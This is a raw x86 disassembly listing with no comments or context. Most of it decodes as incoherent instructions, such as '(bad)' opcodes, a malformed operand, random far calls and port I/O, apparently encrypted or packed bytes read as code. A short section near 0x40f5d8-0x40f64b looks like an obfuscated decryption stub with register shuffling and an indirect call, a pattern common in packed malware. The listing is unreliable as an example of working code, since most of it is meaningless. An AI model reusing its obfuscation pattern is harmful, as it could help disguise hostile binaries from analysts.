  40f3bd:	outs   dx,BYTE PTR ds:[esi]
  40f3be:	xchg   esp,eax
  40f3bf:	psraw  mm1,mm3
  40f3c2:	pop    esi
  40f3c3:	or     eax,0xf23c19d0
  40f3c8:	shr    BYTE PTR [esi+0x3e],cl
  40f3cb:	fbstp  TBYTE PTR [eax+ecx*2-0xa2df42d]
  40f3d2:	call   0xa928:0xf55663b2
  40f3d9:	and    DWORD PTR [edi-0x6279ed12],ebp
  40f3df:	loopne 0x40f38e
  40f3e1:	in     eax,dx
  40f3e2:	push   ebx
  40f3e3:	daa    
  40f3e4:	add    DWORD PTR [edx-0x2e],ebp
  40f3e7:	mov    ds:0x63573076,eax
  40f3ec:	outs   dx,DWORD PTR ds:[esi]
  40f3ed:	jmp    0xed2fd0f5
  40f3f2:	jp     0x40f433
  40f3f4:	mov    ecx,0x4515696b
  40f3f9:	add    al,0x10
  40f3fb:	jge    0x40f467
  40f3fd:	adc    ah,BYTE PTR [ebx]
  40f3ff:	push   ss
  40f400:	popa   
  40f401:	test   al,0x20
  40f403:	retf   
  40f404:	aaa    
  40f405:	push   edi
  40f406:	xor    al,0xc3
  40f408:	in     al,dx
  40f409:	and    BYTE PTR [ebx],dh
  40f40b:	lock paddb mm5,QWORD PTR [edi]
  40f40f:	xchg   edi,eax
  40f410:	fs je  0x40f43f
  40f413:	and    eax,0xec5cd20b
  40f418:	jle    0x40f495
  40f41a:	pop    ss
  40f41b:	mov    dh,0x2d
  40f41d:	jg     0x40f44d
  40f41f:	je     0x40f432
  40f421:	aam    0x27
  40f423:	fmul   DWORD PTR [edi-0x38]
  40f426:	cmp    BYTE PTR [edi-0x53],ch
  40f429:	push   cs
  40f42a:	or     al,0x1f
  40f42c:	mov    edx,DWORD PTR [ebp+0x12]
  40f42f:	mov    ds:0xbabc0b9f,eax
  40f434:	adc    ch,al
  40f436:	cmp    al,0x90
  40f438:	adc    edx,DWORD PTR [ebx-0x24]
  40f43b:	adc    BYTE PTR [ebx+edi*4],0x63
  40f43f:	and    ah,dh
  40f441:	push   edi
  40f442:	mov    bl,0x9
  40f444:	scas   al,BYTE PTR es:[edi]
  40f445:	cli    
  40f446:	test   eax,0x766c37e2
  40f44b:	add    BYTE PTR [eax],0x88
  40f44e:	fsubrp st(7),st
  40f450:	test   BYTE PTR [esi+0x206e3290],dh
  40f456:	jp     0x40f47d
  40f458:	pushf  
  40f459:	fsubr  QWORD PTR [ebp+0x1a5ad74d]
  40f45f:	pop    ecx
  40f460:	push   ebx
  40f461:	loopne 0x40f434
  40f463:	loop   0x40f3e6
  40f465:	sub    eax,0x2c0710e
  40f46a:	ja     0x40f44d
  40f46c:	clc    
  40f46d:	dec    esp
  40f46e:	repz cwde 
  40f470:	and    dh,cl
  40f472:	jecxz  0x40f496
  40f474:	and    BYTE PTR [ecx-0x3bbdb273],cl
  40f47a:	stos   DWORD PTR es:[edi],eax
  40f47b:	push   esp
  40f47c:	mov    eax,0x9d0fa3f1
  40f481:	fst    DWORD PTR [ebp+ebp*4-0x17]
  40f485:	popf   
  40f486:	sbb    al,0xc6
  40f488:	arpl   WORD PTR [esi+0x28f05d6f],cx
  40f48e:	daa    
  40f48f:	pop    esp
  40f490:	mov    esi,cs
  40f492:	fidivr DWORD PTR [ebx]
  40f494:	jne    0x40f4e0
  40f496:	jo     0x40f44f
  40f498:	inc    esi
  40f499:	sti    
  40f49a:	jp     0x40f42c
  40f49c:	xchg   ebp,eax
  40f49d:	push   esi
  40f49e:	jg     0x40f4fc
  40f4a0:	inc    ebx
  40f4a1:	call   0xcb8:0xebb79ba2
  40f4a8:	xchg   edi,eax
  40f4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4aa:	mov    dh,0xc1
  40f4ac:	pop    es
  40f4ad:	popf   
  40f4ae:	shl    ecx,0x7a
  40f4b1:	jb     0x40f43a
  40f4b3:	mov    ah,0x6e
  40f4b5:	mov    DWORD PTR [esi+0x2c2f8e62],eax
  40f4bb:	push   ebp
  40f4bc:	(bad)  
  40f4be:	pusha  
  40f4bf:	pop    es
  40f4c0:	jbe    0x40f46b
  40f4c2:	bound  edi,QWORD PTR [ebx-0x29873a85]
  40f4c8:	mov    esi,0x374d85c6
  40f4cd:	and    DWORD PTR [ebx],edx
  40f4cf:	lea    ebx,[ebx]
  40f4d1:	int3   
  40f4d2:	fimul  DWORD PTR [esp+ebp*8]
  40f4d5:	jnp    0x40f475
  40f4d7:	aaa    
  40f4d8:	(bad)  
  40f4d9:	jne    0x40f4b0
  40f4db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4dc:	jae    0x40f4d4
  40f4de:	or     BYTE PTR [ecx-0x552840f1],bh
  40f4e4:	daa    
  40f4e5:	mov    al,BYTE PTR [eax+eax*8-0x444c5df5]
  40f4ec:	in     al,dx
  40f4ed:	sbb    ah,BYTE PTR [eax-0x34]
  40f4f0:	add    ch,dl
  40f4f2:	mov    esi,0x3fe3578b
  40f4f7:	push   0x4
  40f4f9:	mov    BYTE PTR [ebx-0x8c68bed],ch
  40f4ff:	cmc    
  40f500:	jns    0x40f4bd
  40f502:	mov    edx,0xc797071f
  40f507:	stc    
  40f508:	dec    ebp
  40f509:	adc    bh,ah
  40f50b:	ret    0x4431
  40f50e:	call   0xa522:0x42e563a0
  40f515:	cs mov cl,0x2f
  40f518:	lock inc eax
  40f51a:	add    BYTE PTR [edx],0x1b
  40f51d:	jmp    0x55db67ec
  40f522:	pop    esi
  40f523:	sbb    cl,BYTE PTR [edx+0x4c]
  40f526:	push   esp
  40f527:	push   eax
  40f528:	sahf   
  40f529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f52b:	loopne 0x40f54e
  40f52d:	dec    ebp
  40f52e:	in     eax,dx
  40f52f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f530:	or     esp,DWORD PTR [eax]
  40f532:	in     eax,0x18
  40f534:	cdq    
  40f535:	test   cl,dl
  40f537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f538:	xor    al,cl
  40f53a:	fistp  WORD PTR [edi+0x3b]
  40f53d:	xchg   esi,eax
  40f53e:	scas   al,BYTE PTR es:[edi]
  40f53f:	pop    ss
  40f540:	mov    ds:0xa0eb3f58,eax
  40f545:	add    DWORD PTR [ebx+0x271155ed],ebp
  40f54b:	cmp    ch,BYTE PTR [esp+edi*4]
  40f54e:	add    eax,0x70eac0ff
  40f553:	add    eax,0x3de5c19e
  40f558:	adc    esp,DWORD PTR [edi+0x7743b7c4]
  40f55e:	call   0xe9:0x2599cad2
  40f565:	hlt    
  40f566:	sub    al,0xe7
  40f568:	xchg   BYTE PTR [ebp+0x5fcb2aeb],dh
  40f56e:	icebp  
  40f56f:	xor    eax,0x862a4aa2
  40f574:	imul   esp,DWORD PTR [esi+0xb551f9b],0xe1f24d04
  40f57e:	sub    DWORD PTR [ecx],0x24
  40f581:	imul   ebx,DWORD PTR [edi-0x130a50b4],0xeccf4e85
  40f58b:	cmp    BYTE PTR [ebp+0x23],dh
  40f58e:	and    eax,0xb252050f
  40f593:	clc    
  40f594:	jl     0x40f5df
  40f596:	fsub   DWORD PTR [ebx+0x30]
  40f599:	out    dx,al
  40f59a:	sub    BYTE PTR [ebx+0x4c08c943],ch
  40f5a0:	or     al,0xf0
  40f5a2:	pop    es
  40f5a3:	pop    ss
  40f5a4:	inc    esi
  40f5a5:	out    0xe0,eax
  40f5a7:	pop    es
  40f5a8:	rep stos DWORD PTR es:[edi],eax
  40f5aa:	inc    ecx
  40f5ab:	cmp    cl,cl
  40f5ad:	test   DWORD PTR [ebp-0x75],eax
  40f5b0:	cs push esp
  40f5b2:	push   esp
  40f5b3:	sub    eax,0x864c351
  40f5b8:	in     eax,0x24
  40f5ba:	aad    0x44
  40f5bc:	daa    
  40f5bd:	fisubr WORD PTR [edx]
  40f5bf:	shr    BYTE PTR [esi-0x34],1
  40f5c2:	test   al,0x71
  40f5c4:	xor    eax,0x8dce33ab
  40f5c9:	test   BYTE PTR [ecx],al
  40f5cb:	icebp  
  40f5cc:	jb     0x40f600
  40f5ce:	add    BYTE PTR [ebx+0x558b084d],cl
  40f5d4:	loopne 0x40f55f
  40f5d6:	add    al,0x8a
  40f5d8:	mov    eax,DWORD PTR [ebp-0xc]
  40f5db:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5de:	xor    eax,esi
  40f5e0:	lea    eax,[eax+ecx*1+0x3272f1]
  40f5e7:	mov    DWORD PTR [ebp+0x8],eax
  40f5ea:	mov    eax,DWORD PTR [ebp-0xc]
  40f5ed:	mov    ecx,DWORD PTR [ebp+0x14]
  40f5f0:	xor    eax,esi
  40f5f2:	add    eax,edi
  40f5f4:	imul   eax,DWORD PTR [ecx]
  40f5f7:	mov    ecx,DWORD PTR [ebp-0x4]
  40f5fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f5fd:	xor    ecx,esi
  40f5ff:	lea    ecx,[ecx+edx*1+0x3272f1]
  40f606:	cmp    ecx,eax
  40f608:	jne    0x40d220
  40f60e:	mov    eax,DWORD PTR [ebp-0x4]
  40f611:	xor    eax,esi
  40f613:	add    eax,edi
  40f615:	mov    DWORD PTR [ebp-0x10],eax
  40f618:	mov    ebx,0x65655
  40f61d:	add    ebx,0x3234
  40f623:	xchg   ebx,esi
  40f625:	xor    ebx,ebx
  40f627:	push   esi
  40f628:	mov    esi,ebx
  40f62a:	pop    ebx
  40f62b:	mov    edx,esi
  40f62d:	add    ebx,0x1002
  40f633:	lea    eax,[ebp-0x18]
  40f636:	add    edx,eax
  40f638:	add    edx,0x5
  40f63b:	push   edx
  40f63c:	inc    esi
  40f63d:	pop    ecx
  40f63e:	dec    ecx
  40f63f:	xchg   ecx,eax
  40f640:	dec    eax
  40f641:	xchg   ecx,eax
  40f642:	dec    ecx
  40f643:	xchg   ecx,edx
  40f645:	dec    edx
  40f646:	push   edx
  40f647:	mov    edx,ebx
  40f649:	pop    ebx
  40f64a:	dec    ebx
  40f64b:	call   DWORD PTR [ebx]
  40f64d:	cmp    DWORD PTR [ebp+0x10],esi
  40f650:	je     0x413d8d
  40f656:	xchg   edx,eax
  40f657:	push   0xc
  40f659:	pop    ecx
  40f65a:	dec    ecx
  40f65b:	jmp    0x4119e9
  40f660:	test   al,0x3a
  40f662:	jl     0x40f606
  40f664:	out    dx,al
  40f665:	mov    ds:0xdb3d32a2,al
  40f66a:	sti    
  40f66b:	loopne 0x40f61e
  40f66d:	cwde   
  40f66e:	mov    BYTE PTR [edx+edi*2+0xc8383af],bh
  40f675:	pop    esi
  40f676:	add    DWORD PTR [ebx+0x124a2a4b],0x7f
  40f67d:	push   es
  40f67e:	xchg   ebx,eax
  40f67f:	outs   dx,BYTE PTR ds:[esi]
  40f680:	mov    ah,0x3e
  40f682:	imul   esp,esp,0x634e1389
  40f688:	push   esp
  40f689:	adc    BYTE PTR [edx+0x1f],bl
  40f68c:	cmp    BYTE PTR [edx-0x76f12fff],0xad
  40f693:	outs   dx,BYTE PTR ds:[esi]
  40f694:	les    ebx,FWORD PTR fs:[ebx-0x2e341408]
  40f69b:	dec    esp
  40f69c:	loope  0x40f701
  40f69e:	aam    0xa
  40f6a0:	dec    eax
  40f6a1:	rol    DWORD PTR [edx],cl
  40f6a3:	and    edx,DWORD PTR [ebp+0x74]
  40f6a6:	cli    
  40f6a7:	outs   dx,BYTE PTR ds:[esi]
  40f6a8:	loope  0x40f719
  40f6aa:	lds    ebp,FWORD PTR [ebp-0x3e]
  40f6ad:	adc    eax,0x8888c9cc
  40f6b2:	mov    eax,ds:0xc4591894
  40f6b7:	add    BYTE PTR [edx],al
  40f6b9:	cli    
  40f6ba:	xchg   esp,eax
  40f6bb:	or     DWORD PTR [ebx],0x92411a25
  40f6c1:	xor    ebx,DWORD PTR [ebx+0x39e8f688]
  40f6c7:	xchg   esp,eax
  40f6c8:	mov    ebx,0x46f5a41d
  40f6cd:	push   ds
  40f6ce:	pop    ebp
  40f6cf:	daa    
  40f6d0:	cli    
  40f6d1:	scas   eax,DWORD PTR es:[edi]
  40f6d2:	pop    es
  40f6d3:	add    BYTE PTR [ebx+0x5],al
  40f6d6:	push   ecx
  40f6d7:	add    al,0x9b
  40f6d9:	repz sub ecx,edx
  40f6dc:	cs pop ebx
  40f6de:	dec    ecx
  40f6df:	stos   DWORD PTR es:[edi],eax
  40f6e0:	adc    eax,0x7ffdc255
  40f6e5:	fcmove st,st(7)
  40f6e7:	or     al,0x9a
  40f6e9:	sti    
  40f6ea:	pop    ds
  40f6eb:	ja     0x40f686
  40f6ed:	or     dh,0x88
  40f6f0:	push   0xa6b5872d
  40f6f5:	mov    esi,0x5636668c
  40f6fa:	mov    edi,0x1d3550f5
  40f6ff:	push   esp
  40f700:	gs pop ebp
  40f702:	xor    BYTE PTR [ecx-0x7b],ah
  40f705:	call   0x2b00:0xdd17370a
  40f70c:	fpatan 
  40f70e:	xchg   ecx,eax
  40f70f:	xor    DWORD PTR [edi+0x2dfd8b88],ebx
  40f715:	(bad)  
  40f716:	pushf  
  40f717:	pop    ds
  40f718:	call   DWORD PTR [eax+0x18]
  40f71b:	cdq    
  40f71c:	lods   eax,DWORD PTR ds:[esi]
  40f71d:	add    BYTE PTR [ebx],bh
  40f71f:	bound  ebx,QWORD PTR ds:0xe9fa7266
  40f725:	push   ebx
  40f726:	sar    dl,0xfd
  40f729:	cmp    edx,DWORD PTR [edx]
  40f72b:	push   esi
  40f72c:	mov    edi,0x2339171f
  40f731:	jmp    0x40f754
  40f733:	sbb    eax,0xb38b6256
  40f738:	push   0x3b
  40f73a:	pop    edi
  40f73b:	inc    edi
  40f73c:	das    
  40f73d:	push   ds
  40f73e:	fcmovb st,st(3)
  40f740:	push   ebx
  40f741:	jle    0x40f752
  40f743:	xchg   edx,eax
  40f744:	push   ds
  40f745:	out    dx,al
  40f746:	mov    ?,WORD PTR es:[ecx]
  40f749:	je     0x40f6e8
  40f74b:	fsubr  DWORD PTR [edi-0x7b]
  40f74e:	mov    esp,DWORD PTR ds:0x3787f92a
  40f754:	xchg   ecx,eax
  40f755:	sbb    ebp,DWORD PTR [ecx+0x12]
  40f758:	xor    al,0x83
  40f75a:	mov    ds:0xdedcbb8b,al
  40f75f:	and    edx,DWORD PTR [eax]
  40f761:	shl    ecx,cl
  40f763:	in     eax,dx
  40f764:	arpl   WORD PTR [ebx+0x16afc34e],di
  40f76a:	dec    edi
  40f76b:	jl     0x40f756
  40f76d:	lea    ebx,[eax]
  40f76f:	jbe    0x40f724
  40f771:	cmc    
  40f772:	sbb    DWORD PTR [eax+eax*2],edi
  40f775:	dec    edx
  40f776:	lods   al,BYTE PTR ds:[esi]
  40f777:	shl    BYTE PTR [edi+ebx*4],0xc6
  40f77b:	out    dx,eax
  40f77c:	outs   dx,BYTE PTR ds:[esi]
  40f77d:	fld    QWORD PTR [ecx]
  40f77f:	jg     0x40f744
  40f781:	pop    ebp
  40f782:	popa   
  40f783:	mov    eax,ds:0xc08837c0
  40f788:	(bad)  
  40f78a:	das    
  40f78b:	adc    eax,0xfedf86e1
  40f790:	xchg   edi,eax
  40f791:	adc    eax,0x441ed978
  40f796:	xor    esi,DWORD PTR [ecx]
  40f798:	push   ss
  40f799:	adc    ecx,DWORD PTR [edx-0x60a59244]
  40f79f:	sbb    ah,cl
  40f7a1:	mov    ebx,0xa441e33a
  40f7a6:	inc    eax
  40f7a7:	fidivr DWORD PTR ds:0x904a2706
  40f7ad:	inc    eax
  40f7ae:	btc    DWORD PTR [esi+0x36],ebp
  40f7b2:	call   0xfa9646c5
  40f7b7:	les    ebx,FWORD PTR [ecx]
  40f7b9:	ret    
  40f7ba:	jne    0x40f824
  40f7bc:	adc    eax,0x28a189a5
  40f7c1:	int    0x2e
  40f7c3:	pop    esp
  40f7c4:	mov    DWORD PTR [edi],esi
  40f7c6:	jo     0x40f7a5
  40f7c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7c9:	aam    0x7f
  40f7cb:	sub    eax,0xdf0d6fed
  40f7d0:	mov    cl,0xd
  40f7d2:	aad    0xa1
  40f7d4:	and    al,0x31
  40f7d6:	das    
  40f7d7:	retf   
  40f7d8:	lods   al,BYTE PTR ds:[esi]
  40f7d9:	sbb    al,0xeb
  40f7db:	stos   DWORD PTR es:[edi],eax
  40f7dc:	out    0x5b,al
  40f7de:	jg     0x40f7bc
  40f7e0:	cmp    eax,0x1453804b
  40f7e5:	nop
  40f7e6:	and    al,0xb6
  40f7e8:	sbb    dh,BYTE PTR [edx+edi*2]
  40f7eb:	add    BYTE PTR [edx+0x534a8c35],dl
  40f7f1:	mov    edi,0x338a929f
  40f7f6:	lods   eax,DWORD PTR ds:[esi]
  40f7f7:	push   edi
  40f7f8:	mov    ebp,0x6f768130
  40f7fd:	imul   ebx,DWORD PTR [edi],0xc05cbb31
  40f803:	rol    DWORD PTR [ebx+0x27],0x88
  40f807:	xlat   BYTE PTR ds:[ebx]
  40f808:	retf   
  40f809:	nop
  40f80a:	jmp    0xf06d:0xf1a689e2
  40f811:	fdivr  QWORD PTR [ebx+0xf7d8e90]
  40f817:	dec    esp
  40f818:	stos   BYTE PTR es:[edi],al
  40f819:	dec    ebp
  40f81a:	xchg   edi,eax
  40f81b:	sub    eax,0x622e596
  40f820:	jmp    DWORD PTR [esi+0x162b4144]
  40f826:	mov    eax,0xfff9d52d
  40f82b:	ja     0x40f7ec
  40f82d:	popa   
  40f82e:	push   esp
  40f82f:	cmp    esi,DWORD PTR [ecx]
  40f831:	jb     0x40f86a
  40f833:	in     al,0xc5
  40f835:	ror    BYTE PTR [eax],cl
  40f837:	cmp    ecx,DWORD PTR [ecx-0x7993ed6f]
  40f83d:	ret    
  40f83e:	dec    esi
  40f83f:	jo     0x40f844
  40f841:	jmp    DWORD PTR [ebx-0x2a]
  40f844:	sar    BYTE PTR [ebx+ebx*8],0xef
  40f848:	(bad)  
  40f849:	sub    dl,dh
  40f84b:	ret    
  40f84c:	xchg   esi,eax
  40f84d:	adc    bh,BYTE PTR [edi-0x80]
  40f850:	dec    edx
  40f851:	retf   0xe188
  40f854:	int    0xff
  40f856:	test   eax,0x35c47a28
  40f85b:	out    dx,eax
  40f85c:	in     eax,dx
  40f85d:	out    0xf9,al
  40f85f:	lods   al,BYTE PTR ds:[esi]
  40f860:	fcomp  QWORD PTR [ebx+0x72]
  40f863:	imul   eax,edx,0x14
  40f866:	pop    edi
  40f867:	rcr    DWORD PTR [ecx],cl
  40f869:	(bad)  
  40f86a:	mov    ah,0x32
  40f86c:	mov    ebx,0xe366901d
  40f871:	outs   dx,DWORD PTR ds:[esi]
  40f872:	inc    ebx
  40f873:	or     DWORD PTR [ecx+0x2f54b94e],esp
  40f879:	neg    BYTE PTR [esi+0x4]
  40f87c:	mov    al,dh
  40f87e:	or     bl,BYTE PTR [edi+0x39]
  40f881:	add    eax,DWORD PTR [esi-0x4e]
  40f884:	icebp  
  40f885:	jbe    0x40f82c
  40f887:	jns    0x40f81e
  40f889:	ret    
  40f88a:	clc    
  40f88b:	sbb    esp,DWORD PTR [edx+0x7dfc5cc]
  40f891:	nop
  40f892:	pop    ecx
  40f893:	lock (bad) 
  40f896:	jp     0x40f8b6
  40f898:	jecxz  0x40f82b
  40f89a:	mov    ds:0x9bbfe910,eax
  40f89f:	out    0xac,eax
  40f8a1:	jmp    0xe63c:0x3425
  40f8a7:	jmp    0x40f8f6
  40f8a9:	jo     0x40f8d9
  40f8ab:	adc    al,bl
  40f8ad:	pusha  
  40f8ae:	inc    edx
  40f8af:	aaa    
  40f8b0:	xchg   BYTE PTR [ecx-0x45],bl
  40f8b3:	and    bl,ah
  40f8b5:	adc    ecx,ecx
  40f8b7:	je     0x40f890
  40f8b9:	call   0xe744:0x405f49cc
  40f8c0:	push   ds
  40f8c1:	jg     0x40f85b
  40f8c3:	ret    
  40f8c4:	lock mov cl,0xba
  40f8c7:	inc    eax
  40f8c8:	fiadd  DWORD PTR [eax+esi*8-0x75]
  40f8cd:	les    edx,FWORD PTR [eax-0x27]
  40f8d0:	lahf   
  40f8d1:	mov    WORD PTR [ebx],ss
  40f8d3:	in     al,dx
  40f8d4:	push   edx
  40f8d5:	adc    DWORD PTR [ebp-0x77],esp
  40f8d8:	pop    ds
  40f8d9:	imul   eax,DWORD PTR [ebx],0x45
  40f8dc:	stos   DWORD PTR es:[edi],eax
  40f8dd:	jns    0x40f931
  40f8df:	add    dl,BYTE PTR [esi-0x27]
  40f8e2:	ret    0xfee
  40f8e5:	mov    ds:0x56688f7,eax
  40f8ea:	mov    eax,0x33dea165
  40f8ef:	xor    eax,0x7588c1d7
  40f8f4:	xor    DWORD PTR [ecx+0x2f2b2b9c],edi
  40f8fa:	fs xchg ecx,esi
  40f8fd:	sbb    eax,0xb615535e
  40f902:	repz call 0xc86adfce
  40f908:	push   cs
  40f909:	test   al,0xd
  40f90b:	pop    es
  40f90c:	xchg   esi,eax
  40f90d:	push   es
  40f90e:	and    al,0x44
  40f910:	pop    esp
  40f911:	push   cs
  40f912:	fwait
  40f913:	pop    esp
  40f914:	popa   
  40f915:	out    0x6,eax
  40f917:	lds    ebp,FWORD PTR ds:0x995846a
  40f91d:	mov    eax,ds:0xf1911abe
  40f922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f923:	inc    ebx
  40f924:	cld    
  40f925:	(bad)  
  40f926:	cld    
  40f927:	cmp    eax,0x7e0c505c
  40f92c:	ror    DWORD PTR [ebx+0x2f],cl
  40f92f:	aas    
  40f930:	mov    dl,0x55
  40f932:	and    DWORD PTR [ebx+ebp*2-0x54bf06a1],ebp
  40f939:	sbb    al,0x70
  40f93b:	sub    esi,esi
  40f93d:	pop    ds
  40f93e:	mov    ah,0xaa
  40f940:	daa    
  40f941:	mov    cl,0xae
  40f943:	adc    DWORD PTR [edi-0x39],esi
  40f946:	jnp    0x40f9c2
  40f948:	jge    0x40f9ab
  40f94a:	xor    eax,0x1062f43e
  40f94f:	cmc    
  40f950:	xchg   ebp,eax
  40f951:	inc    edi
  40f952:	mov    dl,0x35
  40f954:	add    al,0x1c
  40f956:	push   ebp
  40f957:	inc    ebp
  40f958:	adc    al,0xae
  40f95a:	les    edi,FWORD PTR [ebx+0x6dba731]
  40f960:	inc    esi
  40f961:	clc    
  40f962:	sbb    bh,cl
  40f964:	mov    ds:0xb05f757d,eax
  40f969:	loopne 0x40f9bc
  40f96b:	repnz jmp 0xc36f:0x3e4f031a
  40f973:	mov    esp,0xe1b8d20b
  40f978:	and    edi,DWORD PTR [ecx+0x121160c4]
  40f97e:	mov    esp,0xcddcf91d
  40f983:	cli    
  40f984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f985:	retf   0x3032
  40f988:	pop    edi
  40f989:	cli    
  40f98a:	dec    edx
  40f98b:	clc    
  40f98c:	dec    esi
  40f98d:	cmp    BYTE PTR [eax-0xd707508],bh
  40f993:	js     0x40f9dc
  40f995:	and    ch,ch
  40f997:	mov    al,ds:0xfc3ff3bf
  40f99c:	mov    WORD PTR [edi+ebp*2-0x6a],cs
  40f9a0:	dec    ebx
  40f9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9a2:	inc    eax
  40f9a3:	jo     0x40f94d
  40f9a5:	rcl    bl,0xdd
  40f9a8:	lods   eax,DWORD PTR ds:[esi]
  40f9a9:	inc    edx
  40f9aa:	mov    ebp,0xd034c837
  40f9af:	adc    edx,DWORD PTR [esi]
  40f9b1:	mov    eax,eax
  40f9b3:	std    
  40f9b4:	outs   dx,BYTE PTR ds:[esi]
  40f9b5:	leave  
  40f9b6:	out    dx,eax
  40f9b7:	push   0xffffff81
  40f9b9:	add    al,0x94
  40f9bb:	jp     0x40fa0b
  40f9bd:	push   edx
  40f9be:	js     0x40f96c
  40f9c0:	lds    eax,FWORD PTR [ecx+0xdad7278]
  40f9c6:	mov    ebp,0xaa2b88db
  40f9cb:	and    bh,BYTE PTR [edx+0x1e]
  40f9ce:	push   ecx
  40f9cf:	push   0x48
  40f9d1:	push   ebx
  40f9d2:	leave  
  40f9d3:	adc    al,0x9e
  40f9d5:	popf   
  40f9d6:	lds    ebp,FWORD PTR [edx-0x15a4ec69]
  40f9dc:	stc    
  40f9dd:	je     0x40f97c
  40f9df:	adc    BYTE PTR [esi],ch
  40f9e1:	pop    ebp
  40f9e2:	shr    BYTE PTR [ebp+0x62a0685d],cl
  40f9e8:	test   DWORD PTR [edx+edi*8],0xab1d20c3
  40f9ef:	in     eax,0x24
  40f9f1:	ja     0x40fa53
  40f9f3:	in     eax,0x3f
  40f9f5:	in     al,dx
  40f9f6:	mov    ecx,0x6c88e947
  40f9fb:	push   eax
  40f9fc:	pop    esp
  40f9fd:	arpl   WORD PTR [edx+edx*4],dx
  40fa00:	sar    ecx,1
  40fa02:	adc    BYTE PTR [esi+0x733cd758],cl
  40fa08:	push   0xd5d993ca
  40fa0d:	xchg   edi,eax
  40fa0e:	iret   
  40fa0f:	popa   
  40fa10:	push   ecx
  40fa11:	or     eax,0x32c09219
  40fa16:	cmp    esp,ebp
  40fa18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa19:	fdiv   DWORD PTR [eax+0x5c0085fa]
  40fa1f:	fimul  DWORD PTR [ebx]
  40fa21:	cmp    al,0x88
  40fa23:	scas   eax,DWORD PTR es:[edi]
  40fa24:	ins    DWORD PTR es:[edi],dx
  40fa25:	out    dx,al
  40fa26:	mov    ds:0x23ab8db9,al
  40fa2b:	jmp    0x40fa74
  40fa2d:	push   eax
  40fa2e:	clc    
  40fa2f:	mov    BYTE PTR [esi-0x6c],ch
  40fa32:	(bad)  
  40fa33:	out    dx,al
  40fa34:	dec    ebp
  40fa35:	xchg   ecx,eax
  40fa36:	add    bh,al
  40fa38:	push   eax
  40fa39:	xchg   bh,bl
  40fa3b:	out    dx,eax
  40fa3c:	mov    ebx,DWORD PTR [esi-0x63]
  40fa3f:	ret    0xff61
  40fa42:	test   al,0xd2
  40fa44:	jb     0x40fa6c
  40fa46:	add    DWORD PTR [ecx+0x6bb993f9],edi
  40fa4c:	sbb    esi,DWORD PTR [esp+ebp*4+0x444dc4a7]
  40fa53:	test   DWORD PTR [ebp+0x545236ec],esp
  40fa59:	call   FWORD PTR [eax-0x384c90d6]
  40fa5f:	test   BYTE PTR [edx],ch
  40fa61:	or     DWORD PTR [ecx-0x5b4cc23a],edi
  40fa67:	arpl   WORD PTR [edx-0x3348e518],ax
  40fa6d:	cwde   
  40fa6e:	je     0x40fae1
  40fa70:	xchg   edi,eax
  40fa71:	mov    eax,0xa54aadba
  40fa76:	or     al,0x8e
  40fa78:	jnp    0x40fac8
  40fa7a:	add    al,0xea
  40fa7c:	les    eax,FWORD PTR [edi+edx*8+0x7b1c7d33]
  40fa83:	sbb    DWORD PTR [esi+ebx*4+0x0],edi
  40fa87:	in     al,dx
  40fa88:	stos   DWORD PTR es:[edi],eax
  40fa89:	ins    BYTE PTR es:[edi],dx
  40fa8a:	jo     0x40fa93
  40fa8c:	inc    ebp
  40fa8d:	daa    
  40fa8e:	mov    edi,es
  40fa90:	xchg   BYTE PTR [ecx-0x2a908dba],dl
  40fa96:	pop    esp
  40fa97:	inc    edi
  40fa98:	fwait
  40fa99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa9a:	ret    
  40fa9b:	xchg   DWORD PTR [edi+0x47],ebp
  40fa9e:	xchg   ecx,eax
  40fa9f:	jae    0x40fa49
  40faa1:	in     eax,dx
  40faa2:	sbb    dl,BYTE PTR [edx+ecx*8]
  40faa5:	dec    edi
  40faa6:	jge    0x40fa56
  40faa8:	pop    ebx
  40faa9:	xchg   esp,eax
  40faaa:	jmp    0x40faff
  40faac:	ret    
  40faad:	inc    esp
  40faae:	mov    cl,0xc5
  40fab0:	jne    0x40fa51
  40fab2:	test   eax,0xcd25eed8
  40fab7:	lods   eax,DWORD PTR fs:[esi]
  40fab9:	(bad)  
  40faba:	xor    eax,0xd583c91d
  40fabf:	fcmovb st,st(5)
  40fac1:	lods   eax,DWORD PTR ds:[esi]
  40fac2:	xchg   ebp,eax
  40fac3:	in     al,dx
  40fac4:	or     DWORD PTR [ebx+0x30b88632],edi
  40faca:	adc    ah,BYTE PTR ds:0x9be3d68
  40fad0:	jp     0x40fb06
  40fad2:	lods   al,BYTE PTR ds:[esi]
  40fad3:	idiv   BYTE PTR [ebp*2+0x2bf11ac8]
  40fada:	dec    ecx
  40fadb:	and    al,0x24
  40fadd:	(bad)  
  40fade:	xor    al,0x6f
  40fae0:	sub    al,0x8f
  40fae2:	test   DWORD PTR [esi-0x2d207dd2],esi
  40fae8:	mov    ah,0xb3
  40faea:	std    
  40faeb:	sbb    al,0x43
  40faed:	mov    DWORD PTR ds:0xeec3b1ee,esi
  40faf3:	jp     0x40fab8
  40faf5:	jle    0x40fb1f
  40faf7:	mov    ds:0xda679ff0,al
  40fafc:	leave  
  40fafd:	mov    ah,ah
  40faff:	mov    ebx,0xb7ace0e1
  40fb04:	dec    esi
  40fb05:	xor    dh,bh
  40fb07:	mov    eax,DWORD PTR [esi]
  40fb09:	pop    edi
  40fb0a:	aas    
  40fb0b:	push   eax
  40fb0c:	das    
  40fb0d:	mov    ah,0x35
  40fb0f:	(bad)  
  40fb10:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40fb12:	push   cs
  40fb13:	bound  ecx,QWORD PTR [ecx+0xa]
  40fb16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb17:	and    BYTE PTR [edi-0x3fa21f8f],bl
